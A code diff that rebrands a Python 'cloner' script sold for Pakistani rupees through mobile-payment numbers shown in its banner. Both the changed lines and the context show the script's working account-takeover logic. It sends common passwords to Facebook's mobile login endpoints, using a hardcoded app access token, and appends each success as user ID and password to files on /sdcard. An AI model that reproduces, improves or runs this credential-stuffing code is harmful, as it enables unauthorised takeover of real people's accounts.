@@ -1,5 +1,5 @@
 #!/usr/bin/env python3
-# ROOH CLONER – SIR ROOHULAMIN EDITION
+# RAJA CLONER – RAJA VAU EDITION
 import os, sys, time, uuid, hashlib, random, requests, base64, subprocess
 from concurrent.futures import ThreadPoolExecutor as tred
 from random import randint as rr
@@ -42,10 +42,10 @@ def banner():
     print(f"{G}│         T O O L - O W N E R   R A J A   V A U            │{W}")
     print(f"{G}├──────────────────────────────────────────────────────────┤{W}")
     print(f"{G}│ JAZZ CASH NO: 03247031231                                │{W}")
-    print(f"{G}│ JAZZ CASH NM: ALTAF HUSAIN                               │{W}")
+    print(f"{G}│ JAZZ CASH NM: RAJA VAU                                   │{W}")
     print(f"{G}├──────────────────────────────────────────────────────────┤{W}")
     print(f"{G}│ ESYPASA NO : 03134374713                                 │{W}")
-    print(f"{G}│ ESYPASA NM : MUHAMAD ZUBAUR                              │{W}")
+    print(f"{G}│ ESYPASA NM : RAJA VAU                                    │{W}")
     print(f"{G}├──────────────────────────────────────────────────────────┤{W}")
     print(f"{G}│ 3 DAYS   : 300 PKR                                       │{W}")
     print(f"{G}│ 7 DAYS   : 650 PKR                                       │{W}")
@@ -71,8 +71,8 @@ def open_whatsapp():
 
 # ---- APPROVAL ----
 def get_machine_key():
-    raw = os.getlogin() + str(os.getuid()) + "ROOH2026"
-    return "ROOH-" + hashlib.md5(raw.encode()).hexdigest().upper()[:12]
+    raw = os.getlogin() + str(os.getuid()) + "RAJA2026"
+    return "RAJA-" + hashlib.md5(raw.encode()).hexdigest().upper()[:12]
 
 def check_approval(key):
     return True
@@ -93,7 +93,7 @@ def approval_flow():
         approval_flow()
     elif choice == 'B':
         if check_approval(key):
-            print("\033[1;32m✅ APPROVED! WELCOME TO ROOH CLONER\033[0m")
+            print("\033[1;32m✅ APPROVED! WELCOME TO RAJA CLONER\033[0m")
             time.sleep(1)
             return True
         else:
@@ -141,7 +141,7 @@ def login_1(uid):
     global loop, oks
     session = requests.session()
     try:
-        sys.stdout.write(f"\r\r\x1b[1;37m\x1b[38;5;196m[\x1b[1;37mROOH-M1\x1b[38;5;196m]\x1b[1;37m\x1b[38;5;196m[\x1b[38;5;192m{loop}\x1b[38;5;196m]\x1b[1;37m\x1b[38;5;196m[\x1b[1;37mOK\x1b[38;5;196m]\x1b[1;37m\x1b[38;5;196m[\x1b[38;5;192m{len(oks)}\x1b[38;5;196m]")
+        sys.stdout.write(f"\r\r\x1b[1;37m\x1b[38;5;196m[\x1b[1;37mRAJA-M1\x1b[38;5;196m]\x1b[1;37m\x1b[38;5;196m[\x1b[38;5;192m{loop}\x1b[38;5;196m]\x1b[1;37m\x1b[38;5;196m[\x1b[1;37mOK\x1b[38;5;196m]\x1b[1;37m\x1b[38;5;196m[\x1b[38;5;192m{len(oks)}\x1b[38;5;196m]")
         sys.stdout.flush()
         for pw in ('123456','1234567','12345678','123456789'):
             data = {
@@ -186,13 +186,13 @@ def login_1(uid):
             }
             res = session.post('https://b-graph.facebook.com/auth/login', data=data, headers=headers, allow_redirects=False).json()
             if 'session_key' in res:
-                print(f"\r\r\x1b[1;37m>\x1b[38;5;196m├Ч\x1b[1;37m<\x1b[38;5;196m(\x1b[1;37mROOH\x1b[38;5;196m) \x1b[1;97m= \x1b[38;5;46m{uid} \x1b[1;97m= \x1b[38;5;46m{pw} \x1b[1;97m= \x1b[38;5;45m{creationyear(uid)}")
-                open('/sdcard/ROOH-OLD-M1-OK.txt', 'a').write(f"{uid}|{pw}\n")
+                print(f"\r\r\x1b[1;37m>\x1b[38;5;196m├Ч\x1b[1;37m<\x1b[38;5;196m(\x1b[1;37mRAJA\x1b[38;5;196m) \x1b[1;97m= \x1b[38;5;46m{uid} \x1b[1;97m= \x1b[38;5;46m{pw} \x1b[1;97m= \x1b[38;5;45m{creationyear(uid)}")
+                open('/sdcard/RAJA-OLD-M1-OK.txt', 'a').write(f"{uid}|{pw}\n")
                 oks.append(uid)
                 break
             elif 'www.facebook.com' in res.get('error', {}).get('message', ''):
-                print(f"\r\r\x1b[1;37m\x1b[38;5;196m(\x1b[1;37mROOH-M1👿\x1b[38;5;196m) \x1b[1;97m= \x1b[38;5;46m{uid} \x1b[1;97m= \x1b[38;5;46m{pw} \x1b[1;97m= \x1b[38;5;45m{creationyear(uid)}")
-                open('/sdcard/ROOH-OLD-M1-OK.txt', 'a').write(f"{uid}|{pw}\n")
+                print(f"\r\r\x1b[1;37m\x1b[38;5;196m(\x1b[1;37mRAJA-M1👿\x1b[38;5;196m) \x1b[1;97m= \x1b[38;5;46m{uid} \x1b[1;97m= \x1b[38;5;46m{pw} \x1b[1;97m= \x1b[38;5;45m{creationyear(uid)}")
+                open('/sdcard/RAJA-OLD-M1-OK.txt', 'a').write(f"{uid}|{pw}\n")
                 oks.append(uid)
                 break
         loop += 1
@@ -201,7 +201,7 @@ def login_1(uid):
 
 def login_2(uid):
     global loop, oks
-    sys.stdout.write(f"\r\r\x1b[1;37m\x1b[38;5;196m+\x1b[1;37m\x1b[38;5;196m(\x1b[1;37mROOH-M2\x1b[38;5;196m)\x1b[1;37m\x1b[38;5;196m(\x1b[38;5;192m{loop}\x1b[38;5;196m)\x1b[1;37m\x1b[38;5;196m(\x1b[1;37mOK\x1b[38;5;196m)\x1b[1;37m\x1b[38;5;196m(\x1b[38;5;192m{len(oks)}\x1b[38;5;196m)")
+    sys.stdout.write(f"\r\r\x1b[1;37m\x1b[38;5;196m+\x1b[1;37m\x1b[38;5;196m(\x1b[1;37mRAJA-M2\x1b[38;5;196m)\x1b[1;37m\x1b[38;5;196m(\x1b[38;5;192m{loop}\x1b[38;5;196m)\x1b[1;37m\x1b[38;5;196m(\x1b[1;37mOK\x1b[38;5;196m)\x1b[1;37m\x1b[38;5;196m(\x1b[38;5;192m{len(oks)}\x1b[38;5;196m)")
     for pw in ('123456','123123','1234567','12345678','123456789'):
         try:
             with requests.Session() as session:
@@ -218,8 +218,8 @@ def login_2(uid):
                 url = f"https://b-api.facebook.com/method/auth.login?format=json&email={str(uid)}&password={str(pw)}&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20¤tly_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true"
                 po = session.get(url, headers=headers).json()
                 if 'session_key' in str(po):
-                    print(f"\r\r\x1b[1;37m\x1b[38;5;196m<\x1b[38;5;196m(\x1b[1;37mROOH\x1b[38;5;196m) \x1b[1;97m= \x1b[38;5;46m{uid} \x1b[1;97m= \x1b[38;5;46m{pw} \x1b[1;97m= \x1b[38;5;45m{creationyear(uid)}")
-                    open('/sdcard/ROOH-OLD-M2-OK.txt', 'a').write(f"{uid}|{pw}\n")
+                    print(f"\r\r\x1b[1;37m\x1b[38;5;196m<\x1b[38;5;196m(\x1b[1;37mRAJA\x1b[38;5;196m) \x1b[1;97m= \x1b[38;5;46m{uid} \x1b[1;97m= \x1b[38;5;46m{pw} \x1b[1;97m= \x1b[38;5;45m{creationyear(uid)}")
+                    open('/sdcard/RAJA-OLD-M2-OK.txt', 'a').write(f"{uid}|{pw}\n")
                     oks.append(uid)
                     break
         except:
